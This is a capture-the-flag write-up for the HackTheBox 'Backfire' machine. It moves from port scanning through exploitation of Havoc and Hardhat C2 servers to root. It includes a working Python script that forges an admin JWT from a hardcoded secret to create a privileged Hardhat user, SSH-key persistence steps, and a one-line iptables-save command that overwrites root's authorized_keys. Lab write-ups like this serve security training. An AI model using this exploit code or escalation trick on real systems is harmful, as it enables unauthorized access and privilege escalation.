---------------

### CTF-: HackTheBox
### LAB-: Backfire

---------------

![image](https://github.com/user-attachments/assets/7aba93cb-a109-4bda-9d07-0c60187b8e32)

---------------

- Rustscan's output-:

```bash
❯ rustscan -a backfire.htb -- -Pn -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/sensei/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.49:22
Open 10.10.11.49:443
Open 10.10.11.49:8000
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-17 08:38 WAT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:38
Completed NSE at 08:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:38                                                                                                                            
Completed NSE at 08:38, 0.00s elapsed                                                                                                              
NSE: Starting runlevel 3 (of 3) scan.                                                                                                              
Initiating NSE at 08:38                                                                                                                            
Completed NSE at 08:38, 0.00s elapsed                                                                                                              
Initiating Connect Scan at 08:38
Scanning backfire.htb (10.10.11.49) [3 ports]
Discovered open port 22/tcp on 10.10.11.49
Discovered open port 443/tcp on 10.10.11.49
Discovered open port 8000/tcp on 10.10.11.49
Completed Connect Scan at 08:38, 0.21s elapsed (3 total ports)
Initiating Service scan at 08:38
Scanning 3 services on backfire.htb (10.10.11.49)
Completed Service scan at 08:38, 13.11s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.11.49.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 08:38
Completed NSE at 08:38, 27.92s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 08:38
Completed NSE at 08:38, 3.80s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 08:38
Completed NSE at 08:38, 0.00s elapsed
Nmap scan report for backfire.htb (10.10.11.49)
Host is up, received user-set (0.20s latency).
Scanned at 2025-03-17 08:38:09 WAT for 45s

PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuxaL9aCVxiQGLRxQPezW3dkgouskvb/BcBJR16VYjHElq7F8C2ByzUTNr0OMeiwft8X5vJaD9GBqoEul4D1QE=
|   256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA2oT7Hn4aUiSdg4vO9rJIbVSVKcOVKozd838ZStpwj8
443/tcp  open  ssl/http syn-ack nginx 1.22.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET POST
|_http-server-header: nginx/1.22.1
| ssl-cert: Subject: commonName=127.0.0.1/stateOrProvinceName=Connecticut/countryName=US/localityName=New Haven/streetAddress=/postalCode=5932
| Subject Alternative Name: IP Address:127.0.0.1
| Issuer: commonName=127.0.0.1/stateOrProvinceName=Connecticut/countryName=US/localityName=New Haven/streetAddress=/postalCode=5932
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-07T11:01:05
| Not valid after:  2028-01-07T11:01:05
| MD5:   b22f:704b:40e4:ca3b:7041:7c0f:a0a4:b252
| SHA-1: 25f2:1fa8:8817:52db:be5b:276e:c47d:8278:2898:2863
| -----BEGIN CERTIFICATE-----
| MIIDxjCCAq6gAwIBAgIQXxBfoPPgreKo23ihIct2nDANBgkqhkiG9w0BAQsFADBl
| MQswCQYDVQQGEwJVUzEUMBIGA1UECBMLQ29ubmVjdGljdXQxEjAQBgNVBAcTCU5l
| dyBIYXZlbjEJMAcGA1UECRMAMQ0wCwYDVQQREwQ1OTMyMRIwEAYDVQQDEwkxMjcu
| MC4wLjEwHhcNMjUwMTA3MTEwMTA1WhcNMjgwMTA3MTEwMTA1WjBlMQswCQYDVQQG
| EwJVUzEUMBIGA1UECBMLQ29ubmVjdGljdXQxEjAQBgNVBAcTCU5ldyBIYXZlbjEJ
| MAcGA1UECRMAMQ0wCwYDVQQREwQ1OTMyMRIwEAYDVQQDEwkxMjcuMC4wLjEwggEi
| MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCcb3mxIvYVAKjUJg+vHxeMJ3PD
| MhXt0hKdHai/iGDylZVkd/Ext3fFWAjWIYUPmvyl1KX8s7RWkjUgNfs7NNFz23At
| wfWStZiUXFQuUNIrsMGff7GjrIKcAmLkAuFmt25br/Y//Y8SC8IsnBxneTd4DBbO
| 8/So7zi86wI3ZZUNJeGo0eXK87dF/PikMHfAc672BVnCKIAt9/wk3FjVeoD9iNZR
| MrpM42c0qRnsZNOBXo6RWVnkjaw1CgO4idSNm4osmk2zXTAjeCfrBdDfAXsEq8So
| I/mwl2MjTdqvuImVr95PI6rb2+4bXfSAZeyEY2xpPGz57ZuFXH3cLxmLsgOJAgMB
| AAGjcjBwMA4GA1UdDwEB/wQEAwICpDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYB
| BQUHAwIwDwYDVR0TAQH/BAUwAwEB/zAdBgNVHQ4EFgQUJXDEoW+wSe+Ptr+R4wBv
| GLenLW8wDwYDVR0RBAgwBocEfwAAATANBgkqhkiG9w0BAQsFAAOCAQEAaznrYizH
| 1AbCdZT8mftAn8JNcVwizyGTpuJs+otSZNpfoNAqMF5tQZvgpPix54XVGCZb5v2G
| p/8kfYjXcmFZXCEyVNrudH+Yr0ZHQU+KLOZ+4l2dsBEZKyD/C5aqxWOb+QBytgUU
| 6oaAiUXfj9Y7nzBp1vpz8teXM9dLJX+xGM2KZ+9ocw/k9Oxf73yTjEuIbme/K4Mr
| IIyDRdmr56Gk504T4GKERcd6kjikfCZLrpu75Qw4M1D0LSqNaS3BzQcRLsnYobqn
| BErrdtvyJEEZbNAMtxel2+SBvwffuWJOTOTIAx+gE4omfMc1axOOYet6p0JBdiDe
| PQGP5TKPHe19cQ==
|_-----END CERTIFICATE-----
|_http-title: 404 Not Found
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
8000/tcp open  http     syn-ack nginx 1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.22.1
| http-ls: Volume /
| SIZE  TIME               FILENAME
| 1559  17-Dec-2024 12:31  disable_tls.patch
| 875   17-Dec-2024 12:34  havoc.yaotl
|_
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Index of /
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- We have open ports `22`,`443` and `8000`.
- In port `8000` which is running a webserver ,I noticed these files `disable_tls.patch` and `havoc.yaotl`.The server is hosting a C2 Havoc server.

![image](https://github.com/user-attachments/assets/eff26c17-ec1b-4ae8-9b3f-13b4516c2011)

- I discovered credentials for 2 users in one of the files.

![image](https://github.com/user-attachments/assets/4c30f546-7356-4b21-9af6-0ae3c6beca0d)

- Havoc is vulnerable to SSRF and RCE as explained [here](https://github.com/kit4py/CVE-2024-41570).

![image](https://github.com/user-attachments/assets/3154a2fb-6420-48d3-a44f-cf188ba3dedf)

- Running the exploit-:

![image](https://github.com/user-attachments/assets/49ad1f30-0e60-4e99-a831-50d68ec83f82)

- To maintain access,we have to copy our public key to the current user's ssh authorized keys.This will allow us login without a password.

![image](https://github.com/user-attachments/assets/4f321e43-dfa0-46ea-bfcf-cf5e35a17ab2)

- User Ilya

![image](https://github.com/user-attachments/assets/9a0184d0-239c-4c65-9b40-b67c2a683a48)


--------------

### Pivoting

--------------


- We have another user `sergej` on the server.

![image](https://github.com/user-attachments/assets/a2b793e4-4a1d-49a7-9ec2-fcdd341b4ff6)

- I ran `netstat -antp` and noticed 2 internal services on port `5000` and `7096`.

![image](https://github.com/user-attachments/assets/f674b09c-e6a8-46df-bc63-91250d7f4a32)

- I also found another note by user `Ilya` stating that user `sergej` installed the `Hardhat c2 framework`.

![image](https://github.com/user-attachments/assets/49ff5a1a-5606-4129-ad2b-0be0a93d9813)

- I discovered an [article](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7) explaining 0days in the Hardhat c2.One allows us to forge the admin jwt token and create a user with administrative privileges.Script-:

```python3
#! /usr/bin/env python3
# @author Siam Thanat Hack Co., Ltd. (STHh)
import jwt
import datetime
import uuid
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

rhost = '127.0.0.1:5000'

# Craft Admin JWT
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

expiration = now + datetime.timedelta(days=28)
payload = {
    "sub": "HardHat_Admin",
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer,
    "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int(expiration.timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")
print("Generated JWT:")
print(token)

# Use Admin JWT to create a new user 'sth_pentest' as TeamLead
burp0_url = f"https://{rhost}/Login/Register"
burp0_headers = {
  "Authorization": f"Bearer {token}",
  "Content-Type": "application/json",
  "Host": "127.0.0.1:7096"
}
burp0_json = {
  "password": "sensei",
  "role": "TeamLead",
  "username": "sensei"
}
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
print(r.text)
```

- The next step is to portforward both ports with ssh.

![image](https://github.com/user-attachments/assets/0bf497f7-6895-405d-812c-4875e858eba3)

- I created a user `sensei` with the script.

![image](https://github.com/user-attachments/assets/9140d614-ddbc-4925-b752-cf6527b07df8)

- C2 server access

![image](https://github.com/user-attachments/assets/7f3a1eb3-f0ea-44af-bae3-a44be63e96f8)

- The server has shell access,we can run commands on the server with it.The `/ImplantInteract` is responsible for it.

![image](https://github.com/user-attachments/assets/776ce9b1-6c3c-4c6f-b5d7-049c43af575d)

- Spawn a shell and copy your public keys to the `authorized_keys`.

![image](https://github.com/user-attachments/assets/c44d72c4-92f5-4bc2-89cc-688e999dc090)

- User `sergej`

![image](https://github.com/user-attachments/assets/a358d84c-3c90-4a6c-81fe-88ae805bb717)

-------------

### PRIVESC with iptables and iptables-save

------------

- User `sergej` can run binaries `iptables` and `iptables-save` as root

![image](https://github.com/user-attachments/assets/52c7a698-882e-4a31-b479-b62eea8faa8a)

- I found this interesting [article](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/) on how to overwrite files with the two binaries.I used it to overwrite the root user's `authorized_keys` file.

![image](https://github.com/user-attachments/assets/7629fb00-e273-4ecd-9c64-eded6b95c664)


- POC-:

```bash
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n[public-key]\n';sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```

- Root

![image](https://github.com/user-attachments/assets/991da75d-66d0-4f97-9c56-ff8b7ea12e74)

------------

### THANKS FOR READING!!!

-------------

### REFERENCES-:

-------------

- [HardHatc2 zerodays](https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7)
- [Iptables privilege escalation](https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/)
- [Havoc SSRF-to-RCE](https://github.com/kit4py/CVE-2024-41570)

---------------












